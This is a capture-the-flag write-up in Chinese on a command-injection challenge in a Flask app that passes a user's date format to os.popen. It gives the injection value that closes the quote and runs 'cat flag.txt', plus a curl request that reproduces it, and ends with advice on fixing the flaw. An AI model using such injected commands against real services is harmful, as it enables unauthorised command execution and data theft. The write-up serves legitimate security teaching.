# Greycademy2025 Command Injection

## 题目简述

Flask 应用把用户提交的日期格式拼进 shell 命令并通过 `os.popen` 执行。目标是闭合原有双引号、注入第二条命令，并让输出继续由模板回显。

## 解题过程

后端构造命令的方式是：

```python
os.popen(f'date +"{request.form.get("format", "")}"').read()
```

若 `format` 提交为：

```text
"; cat flag.txt #
```

最终 shell 文本变成：

```bash
date +""; cat flag.txt #"
```

第一个双引号关闭 `date` 的格式参数，分号开始第二条命令，`#` 注释掉应用补上的末尾引号。用 HTTP 请求复现：

```bash
curl -s -X POST http://target/ \
  --data-urlencode 'format="; cat flag.txt #'
```

`cat` 的标准输出被 `os.popen(...).read()` 捕获并放入页面中的 `date` 变量，得到：

```text
grey{injectable}
```

## 方法总结

命令注入分析要先写出“拼接后的完整命令”，再设计闭合、命令分隔和注释三部分，而不是盲试特殊字符。根因是把不可信输入交给 shell；修复时应使用不经过 shell 的参数数组或直接调用日期格式化 API，并对允许的格式字符建立白名单。
